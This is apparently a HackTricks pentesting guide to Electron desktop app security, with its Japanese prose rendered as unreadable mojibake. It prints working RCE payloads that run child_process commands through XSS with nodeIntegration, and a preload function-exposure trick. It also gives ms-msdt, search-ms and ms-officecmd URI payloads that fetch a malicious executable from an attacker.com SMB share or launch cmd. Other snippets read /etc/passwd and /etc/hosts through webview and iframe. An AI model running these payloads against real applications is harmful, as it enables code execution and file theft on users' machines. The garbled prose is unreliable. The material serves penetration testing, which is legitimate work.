# Electronãƒ‡ã‚¹ã‚¯ãƒˆãƒƒãƒ—ã‚¢ãƒ—ãƒª

<details>

<summary><strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã™ã‚‹ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ ã™ã‚‹**ã€ã¾ãŸã¯**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’**å…±æœ‰ã™ã‚‹**ã€‚

</details>

## ã¯ã˜ã‚ã«

Electronã¯**Chromiumã«åŸºã¥ã„ã¦ã„ã¾ã™**ãŒã€ãƒ–ãƒ©ã‚¦ã‚¶ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ç¾ä»£ã®ãƒ–ãƒ©ã‚¦ã‚¶ã«å®Ÿè£…ã•ã‚Œã¦ã„ã‚‹ç‰¹å®šã®åŸå‰‡ã¨ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã¯å­˜åœ¨ã—ã¾ã›ã‚“ã€‚\
Electronã¯ã€**NodeJS**ãŒ**ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰**ã§ã€**chromium**ãŒ**ãƒ•ãƒ­ãƒ³ãƒˆã‚¨ãƒ³ãƒ‰**ã§ã‚ã‚‹ãƒ­ãƒ¼ã‚«ãƒ«ã®ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰+ãƒ•ãƒ­ãƒ³ãƒˆã‚¨ãƒ³ãƒ‰ã‚¢ãƒ—ãƒªã®ã‚ˆã†ã«è¦‹ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

é€šå¸¸ã€Electronã‚¢ãƒ—ãƒªã®ã‚³ãƒ¼ãƒ‰ã¯`.asar`ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å†…ã«è¦‹ã¤ã‹ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ãŒã€ã‚³ãƒ¼ãƒ‰ã‚’å–å¾—ã™ã‚‹ã«ã¯ãã‚Œã‚’æŠ½å‡ºã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š
```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```
```markdown
Electronã‚¢ãƒ—ãƒªã®ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰å†…ã®`packet.json`ã§ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è¨­å®šãŒæŒ‡å®šã•ã‚ŒãŸ`main.js`ãƒ•ã‚¡ã‚¤ãƒ«ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```
```json
{
"name": "standard-notes",
"main": "./app/index.js",
```
Electronã«ã¯2ç¨®é¡ã®ãƒ—ãƒ­ã‚»ã‚¹ãŒã‚ã‚Šã¾ã™ï¼š

* ãƒ¡ã‚¤ãƒ³ãƒ—ãƒ­ã‚»ã‚¹ï¼ˆNodeJSã¸ã®å®Œå…¨ãªã‚¢ã‚¯ã‚»ã‚¹ãŒã‚ã‚Šã¾ã™ï¼‰
* ãƒ¬ãƒ³ãƒ€ãƒ©ãƒ¼ãƒ—ãƒ­ã‚»ã‚¹ï¼ˆã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¸Šã®ç†ç”±ã‹ã‚‰NodeJSã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’åˆ¶é™ã™ã¹ãã§ã™ï¼‰

![](<../../../.gitbook/assets/image (307) (5) (1).png>)

**ãƒ¬ãƒ³ãƒ€ãƒ©ãƒ¼ãƒ—ãƒ­ã‚»ã‚¹**ã¯ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿è¾¼ã‚€ãƒ–ãƒ©ã‚¦ã‚¶ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã«ãªã‚Šã¾ã™ï¼š
```javascript
const {BrowserWindow} = require('electron');
let win = new BrowserWindow();

//Open Renderer Process
win.loadURL(`file://path/to/index.html`);
```
**ãƒ¬ãƒ³ãƒ€ãƒ©ãƒ¼ãƒ—ãƒ­ã‚»ã‚¹**ã®è¨­å®šã¯ã€main.jsãƒ•ã‚¡ã‚¤ãƒ«å†…ã®**ãƒ¡ã‚¤ãƒ³ãƒ—ãƒ­ã‚»ã‚¹**ã§**è¨­å®š**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚è¨­å®šãŒæ­£ã—ãæ§‹æˆã•ã‚Œã¦ã„ã‚‹å ´åˆã€Electronã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒRCEã‚„ä»–ã®è„†å¼±æ€§ã‚’**é˜²ã**ã“ã¨ãŒã§ãã¾ã™ã€‚

ãƒ‡ã‚¹ã‚¯ãƒˆãƒƒãƒ—ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€Node APIã‚’é€šã˜ã¦ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‡ãƒã‚¤ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ä»¥ä¸‹ã®äºŒã¤ã®è¨­å®šã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®JavaScriptãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‡ãƒã‚¤ã‚¹ã‚„ã‚·ã‚¹ãƒ†ãƒ ãƒ¬ãƒ™ãƒ«ã®ã‚³ãƒãƒ³ãƒ‰ã«ç›´æ¥ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã®ã‚’**é˜²ã**ãŸã‚ã®ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã‚’æä¾›ã—ã¾ã™ã€‚

* **`nodeIntegration`** - ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯`off`ã§ã™ã€‚ã‚ªãƒ³ã®å ´åˆã€ãƒ¬ãƒ³ãƒ€ãƒ©ãƒ¼ãƒ—ãƒ­ã‚»ã‚¹ã‹ã‚‰nodeã®æ©Ÿèƒ½ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚
* **`contextIsolation`** - ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯`on`ã§ã™ã€‚ã‚ªãƒ³ã®å ´åˆã€ãƒ¡ã‚¤ãƒ³ãƒ—ãƒ­ã‚»ã‚¹ã¨ãƒ¬ãƒ³ãƒ€ãƒ©ãƒ¼ãƒ—ãƒ­ã‚»ã‚¹ã¯åˆ†é›¢ã•ã‚Œã¦ã„ã¾ã›ã‚“ã€‚
* **`preload`** - ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ç©ºã§ã™ã€‚
* [**`sandbox`**](https://docs.w3cub.com/electron/api/sandbox-option) - ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯offã§ã™ã€‚NodeJSãŒå®Ÿè¡Œã§ãã‚‹ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’åˆ¶é™ã—ã¾ã™ã€‚
* ãƒ¯ãƒ¼ã‚«ãƒ¼å†…ã®Nodeçµ±åˆ
* **`nodeIntegrationInSubframes`**- ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯`off`ã§ã™ã€‚
* **`nodeIntegration`**ãŒ**æœ‰åŠ¹**ã®å ´åˆã€Electronã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å†…ã®iframeã§ãƒ­ãƒ¼ãƒ‰ã•ã‚Œã‚‹Webãƒšãƒ¼ã‚¸ã§**Node.js API**ã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚
* **`nodeIntegration`**ãŒ**ç„¡åŠ¹**ã®å ´åˆã€ãƒ—ãƒªãƒ­ãƒ¼ãƒ‰ã¯iframeå†…ã§ãƒ­ãƒ¼ãƒ‰ã•ã‚Œã¾ã™

è¨­å®šã®ä¾‹ï¼š
```javascript
const mainWindowOptions = {
title: 'Discord',
backgroundColor: getBackgroundColor(),
width: DEFAULT_WIDTH,
height: DEFAULT_HEIGHT,
minWidth: MIN_WIDTH,
minHeight: MIN_HEIGHT,
transparent: false,
frame: false,
resizable: true,
show: isVisible,
webPreferences: {
blinkFeatures: 'EnumerateDevices,AudioOutputDevices',
nodeIntegration: false,
contextIsolation: false,
sandbox: false,
nodeIntegrationInSubFrames: false,
preload: _path2.default.join(__dirname, 'mainScreenPreload.js'),
nativeWindowOpen: true,
enableRemoteModule: false,
spellcheck: true
}
};
```
**RCEãƒšã‚¤ãƒ­ãƒ¼ãƒ‰** ã¯[ã“ã¡ã‚‰](https://7as.es/electron/nodeIntegration\_rce.txt)ã‹ã‚‰:
```html
Example Payloads (Windows):
<img src=x onerror="alert(require('child_process').execSync('calc').toString());">

Example Payloads (Linux & MacOS):
<img src=x onerror="alert(require('child_process').execSync('gnome-calculator').toString());">
<img src=x onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());">
<img src=x onerror="alert(require('child_process').execSync('id').toString());">
<img src=x onerror="alert(require('child_process').execSync('ls -l').toString());">
<img src=x onerror="alert(require('child_process').execSync('uname -a').toString());">
```
### ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã®ã‚­ãƒ£ãƒ—ãƒãƒ£

start-mainã®è¨­å®šã‚’å¤‰æ›´ã—ã€ãƒ—ãƒ­ã‚­ã‚·ã®ä½¿ç”¨ã‚’è¿½åŠ ã—ã¾ã™ã€‚ä¾‹ãˆã°ï¼š
```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```
## Electron ãƒ­ãƒ¼ã‚«ãƒ«ã‚³ãƒ¼ãƒ‰ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³

Electron ã‚¢ãƒ—ãƒªã‚’ãƒ­ãƒ¼ã‚«ãƒ«ã§å®Ÿè¡Œã§ãã‚‹å ´åˆã€ä»»æ„ã® JavaScript ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã•ã›ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚æ–¹æ³•ã¯ä»¥ä¸‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md" %}
[macos-electron-applications-injection.md](../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md)
{% endcontent-ref %}

## RCE: XSS + nodeIntegration

**nodeIntegration** ãŒ **on** ã«è¨­å®šã•ã‚Œã¦ã„ã‚‹å ´åˆã€Web ãƒšãƒ¼ã‚¸ã® JavaScript ã¯ `require()` ã‚’å‘¼ã³å‡ºã™ã ã‘ã§ Node.js ã®æ©Ÿèƒ½ã‚’ç°¡å˜ã«ä½¿ç”¨ã§ãã¾ã™ã€‚ä¾‹ãˆã°ã€Windows ã§ calc ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã™ã‚‹æ–¹æ³•ã¯ä»¥ä¸‹ã®é€šã‚Šã§ã™ï¼š
```html
<script>
require('child_process').exec('calc');
// or
top.require('child_process').exec('open /System/Applications/Calculator.app');
</script>
```
<figure><img src="../../../.gitbook/assets/image (5) (4).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

ã“ã®è¨­å®šã§æŒ‡å®šã•ã‚ŒãŸã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯**ä»–ã®ãƒ¬ãƒ³ãƒ€ãƒ©ãƒ¼ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚ˆã‚Šå…ˆã«èª­ã¿è¾¼ã¾ã‚Œã‚‹**ãŸã‚ã€**Node APIã¸ã®ç„¡åˆ¶é™ã®ã‚¢ã‚¯ã‚»ã‚¹**ã‚’æŒã£ã¦ã„ã¾ã™ï¼š
```javascript
new BrowserWindow{
webPreferences: {
nodeIntegration: false,
preload: _path2.default.join(__dirname, 'perload.js'),
}
});
```
ã—ãŸãŒã£ã¦ã€ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯node-featuresã‚’ãƒšãƒ¼ã‚¸ã«ã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆã§ãã¾ã™ï¼š

{% code title="preload.js" %}
```javascript
typeof require === 'function';
window.runCalc = function(){
require('child_process').exec('calc')
};
```
```
{% endcode %}

{% code title="index.html" %}
```
```html
<body>
<script>
typeof require === 'undefined';
runCalc();
</script>
</body>
```
{% endcode %}

{% hint style="info" %}
**`contextIsolation`ãŒã‚ªãƒ³ã®å ´åˆã€ã“ã‚Œã¯æ©Ÿèƒ½ã—ã¾ã›ã‚“**
{% endhint %}

## RCE: XSS + contextIsolation

_**contextIsolation**_ ã¯ã€ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¨JavaScript Electronã®å†…éƒ¨ã‚³ãƒ¼ãƒ‰ã¨ã®é–“ã«**åˆ†é›¢ã•ã‚ŒãŸã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚’å°å…¥ã—ã¾ã™**ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€å„ã‚³ãƒ¼ãƒ‰ã®JavaScriptå®Ÿè¡ŒãŒäº’ã„ã«å½±éŸ¿ã‚’ä¸ãˆãªã„ã‚ˆã†ã«ã—ã¾ã™ã€‚ã“ã‚Œã¯RCEã®å¯èƒ½æ€§ã‚’æ’é™¤ã™ã‚‹ãŸã‚ã«å¿…è¦ãªæ©Ÿèƒ½ã§ã™ã€‚

ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆãŒåˆ†é›¢ã•ã‚Œã¦ã„ãªã„å ´åˆã€æ”»æ’ƒè€…ã¯ä»¥ä¸‹ã®ã“ã¨ãŒã§ãã¾ã™ï¼š

1. ãƒ¬ãƒ³ãƒ€ãƒ©ãƒ¼ã§**ä»»æ„ã®JavaScriptã‚’å®Ÿè¡Œã™ã‚‹**ï¼ˆXSSã¾ãŸã¯å¤–éƒ¨ã‚µã‚¤ãƒˆã¸ã®ãƒŠãƒ“ã‚²ãƒ¼ã‚·ãƒ§ãƒ³ï¼‰
2. ãƒ—ãƒªãƒ­ãƒ¼ãƒ‰ã¾ãŸã¯Electronå†…éƒ¨ã‚³ãƒ¼ãƒ‰ã§ä½¿ç”¨ã•ã‚Œã‚‹**çµ„ã¿è¾¼ã¿ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä¸Šæ›¸ãã™ã‚‹**
3. **ä¸Šæ›¸ãã•ã‚ŒãŸé–¢æ•°ã®ä½¿ç”¨ã‚’ãƒˆãƒªã‚¬ãƒ¼ã™ã‚‹**
4. RCE?

çµ„ã¿è¾¼ã¿ãƒ¡ã‚½ãƒƒãƒ‰ãŒä¸Šæ›¸ãã•ã‚Œã‚‹å ´æ‰€ã¯2ã¤ã‚ã‚Šã¾ã™ï¼šãƒ—ãƒªãƒ­ãƒ¼ãƒ‰ã‚³ãƒ¼ãƒ‰ã¾ãŸã¯Electronå†…éƒ¨ã‚³ãƒ¼ãƒ‰ã§ï¼š

{% content-ref url="electron-contextisolation-rce-via-preload-code.md" %}
[electron-contextisolation-rce-via-preload-code.md](electron-contextisolation-rce-via-preload-code.md)
{% endcontent-ref %}

{% content-ref url="electron-contextisolation-rce-via-electron-internal-code.md" %}
[electron-contextisolation-rce-via-electron-internal-code.md](electron-contextisolation-rce-via-electron-internal-code.md)
{% endcontent-ref %}

{% content-ref url="electron-contextisolation-rce-via-ipc.md" %}
[electron-contextisolation-rce-via-ipc.md](electron-contextisolation-rce-via-ipc.md)
{% endcontent-ref %}

### ã‚¯ãƒªãƒƒã‚¯ã‚¤ãƒ™ãƒ³ãƒˆã®ãƒã‚¤ãƒ‘ã‚¹

ãƒªãƒ³ã‚¯ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ãŸã¨ãã«åˆ¶é™ãŒé©ç”¨ã•ã‚Œã¦ã„ã‚‹å ´åˆã€é€šå¸¸ã®å·¦ã‚¯ãƒªãƒƒã‚¯ã®ä»£ã‚ã‚Šã«**ãƒŸãƒ‰ãƒ«ã‚¯ãƒªãƒƒã‚¯ã‚’è¡Œã†**ã“ã¨ã§ãã‚Œã‚‰ã‚’ãƒã‚¤ãƒ‘ã‚¹ã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚
```javascript
window.addEventListener('click', (e) => {
```
## RCE via shell.openExternal

Electronãƒ‡ã‚¹ã‚¯ãƒˆãƒƒãƒ—ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒé©åˆ‡ãª`nodeIntegration`ã€`contextIsolation`è¨­å®šã§ãƒ‡ãƒ—ãƒ­ã‚¤ã•ã‚Œã¦ã„ã‚‹å ´åˆã€**ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆå´ã®RCEã¯ã€ãƒ—ãƒªãƒ­ãƒ¼ãƒ‰ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚„ãƒ¡ã‚¤ãƒ³ãƒ—ãƒ­ã‚»ã‚¹ã‹ã‚‰ã®Electronãƒã‚¤ãƒ†ã‚£ãƒ–ã‚³ãƒ¼ãƒ‰ã‚’ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã«ã™ã‚‹ã“ã¨ã¯ã§ããªã„**ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚

ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãƒªãƒ³ã‚¯ã‚’ã‚¯ãƒªãƒƒã‚¯ã™ã‚‹ãŸã³ã«ã€ã¾ãŸã¯æ–°ã—ã„ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã‚’é–‹ããŸã³ã«ã€ä»¥ä¸‹ã®ã‚¤ãƒ™ãƒ³ãƒˆãƒªã‚¹ãƒŠãƒ¼ãŒå‘¼ã³å‡ºã•ã‚Œã¾ã™ï¼š

{% code overflow="wrap" %}
```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```
{% endcode %}

ãƒ‡ã‚¹ã‚¯ãƒˆãƒƒãƒ—ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€ç‹¬è‡ªã®**ãƒ“ã‚¸ãƒã‚¹ãƒ­ã‚¸ãƒƒã‚¯**ã‚’å®Ÿè£…ã™ã‚‹ãŸã‚ã«ã“ã‚Œã‚‰ã®ãƒªã‚¹ãƒŠãƒ¼ã‚’**ä¸Šæ›¸ãã—ã¾ã™**ã€‚æ–°ã—ã„ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã‚’ä½œæˆã™ã‚‹éš›ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ãƒŠãƒ“ã‚²ãƒ¼ãƒˆã•ã‚ŒãŸãƒªãƒ³ã‚¯ã‚’ãƒ‡ã‚¹ã‚¯ãƒˆãƒƒãƒ—ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã‚„ã‚¿ãƒ–ã§é–‹ãã¹ãã‹ã€ãã‚Œã¨ã‚‚ã‚¦ã‚§ãƒ–ãƒ–ãƒ©ã‚¦ã‚¶ã§é–‹ãã¹ãã‹ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¾ã™ã€‚ä¾‹ã§ã¯ã€`openInternally`é–¢æ•°ã§æ¤œè¨¼ãŒå®Ÿè£…ã•ã‚Œã¦ãŠã‚Šã€ã“ã‚ŒãŒ`false`ã‚’è¿”ã™å ´åˆã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ãƒªãƒ³ã‚¯ã‚’ã‚¦ã‚§ãƒ–ãƒ–ãƒ©ã‚¦ã‚¶ã§é–‹ãã¹ãã ã¨åˆ¤æ–­ã—ã€`shell.openExternal`é–¢æ•°ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

**ã“ã¡ã‚‰ã¯ç°¡ç•¥åŒ–ã•ã‚ŒãŸæ“¬ä¼¼ã‚³ãƒ¼ãƒ‰ã§ã™ï¼š**

![](<../../../.gitbook/assets/image (638) (2) (1) (1).png>)

![](<../../../.gitbook/assets/image (620).png>)

Electron JSã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ™ã‚¹ãƒˆãƒ—ãƒ©ã‚¯ãƒ†ã‚£ã‚¹ã«å¾“ã£ã¦ã€`openExternal`é–¢æ•°ã¯**ä¿¡é ¼ã§ããªã„ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’å—ã‘å…¥ã‚Œã‚‹ã¹ãã§ã¯ã‚ã‚Šã¾ã›ã‚“**ã€‚ãªãœãªã‚‰ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒhttps://ã‚„http://ã®ã‚ˆã†ãªãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’é€šã˜ã¦ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒŠãƒ“ã‚²ãƒ¼ã‚·ãƒ§ãƒ³ã‚’åˆ¶é™ã—ãªã„å ´åˆã€**ç•°ãªã‚‹ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’æ‚ªç”¨ã—ã¦RCEã«ã¤ãªãŒã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ã‹ã‚‰ã§ã™**ã€‚

ç•°ãªã‚‹OSã¯RCEã‚’å¼•ãèµ·ã“ã™å¯èƒ½æ€§ã®ã‚ã‚‹ç•°ãªã‚‹ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™ã€‚ãã‚Œã‚‰ã«ã¤ã„ã¦ã®è©³ç´°ã¯[https://positive.security/blog/url-open-rce](https://positive.security/blog/url-open-rce#windows-10-19042)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ãŒã€ã“ã“ã«ã„ãã¤ã‹ã®Windowsã®ä¾‹ã‚’æŒ™ã’ã¾ã™ï¼š
```html
<script>
window.open("ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22")
</script>


<script>
window.open("search-ms:query=malicious_executable.exe&crumb=location:%5C%[5Cattacker.com](<http://5cattacker.com/>)%5Csmb_share%5Ctools&displayname=Important%20update")
</script>


<script>
window.open("ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D")
</script>
```
ã“ã®ä¾‹ã«ã¤ã„ã¦ã®è©³ç´°ã¯ã€[https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) ã¨ [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/) ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚

## å†…éƒ¨ãƒ•ã‚¡ã‚¤ãƒ«ã®èª­ã¿å–ã‚Š: XSS + contextIsolation

`contextIsolation` ãŒ false ã«è¨­å®šã•ã‚Œã¦ã„ã‚‹å ´åˆã€\<webview>ï¼ˆ\<iframe> ã«ä¼¼ã¦ã„ã¾ã™ãŒã€ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿è¾¼ã‚€ã“ã¨ãŒã§ãã¾ã™ï¼‰ã‚’ä½¿ç”¨ã—ã¦ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å–ã‚Šã€ãã‚Œã‚‰ã‚’æŠœãå‡ºã™ã“ã¨ãŒã§ãã¾ã™ã€‚ä¾‹ãˆã°ã€**\<webview src=â€file:///etc/passwdâ€>\</webview>:** ã®ã‚ˆã†ã«ä½¿ç”¨ã—ã¾ã™ã€‚

![](../../../.gitbook/assets/1-u1jdryuwaevwjmf\_f2ttjg.png)

åˆ¥ã®æ–¹æ³•ã¨ã—ã¦ã€ã“ã®[**writeup**](https://bugcrowd.com/disclosures/f7ce8504-0152-483b-bbf3-fb9b759f9f89/critical-local-file-read-in-electron-desktop-app)ã‹ã‚‰**å†…éƒ¨ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å–ã‚‹**ã“ã¨ã‚‚ã§ãã¾ã™ã€‚
```html
<br><BR><BR><BR>
<h1>pwn<br>
<iframe onload=j() src="/etc/hosts">xssxsxxsxs</iframe>
<script type="text/javascript">
function j(){alert('pwned contents of /etc/hosts :\n\n '+frames[0].document.body.innerText)}
</script>
```
## **RCE: XSS + å¤ã„Chromium**

ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒä½¿ç”¨ã—ã¦ã„ã‚‹**chromium**ãŒ**å¤ã**ã€æ—¢çŸ¥ã®**è„†å¼±æ€§**ãŒå­˜åœ¨ã™ã‚‹å ´åˆã€**XSSã‚’åˆ©ç”¨ã—ã¦RCEã‚’å®Ÿç¾ã™ã‚‹**å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚\
ã“ã®**writeup**ã§ä¾‹ã‚’è¦‹ã‚‹ã“ã¨ãŒã§ãã¾ã™: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)

## **å†…éƒ¨URLæ­£è¦è¡¨ç¾ãƒã‚¤ãƒ‘ã‚¹ã«ã‚ˆã‚‹XSSãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°**

XSSã‚’è¦‹ã¤ã‘ãŸãŒã€**RCEã‚’ãƒˆãƒªã‚¬ãƒ¼ã—ãŸã‚Šå†…éƒ¨ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ç›—ã‚€ã“ã¨ãŒã§ããªã„**å ´åˆã€**ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ã‚’é€šã˜ã¦èªè¨¼æƒ…å ±ã‚’ç›—ã‚€**ãŸã‚ã«ãã‚Œã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

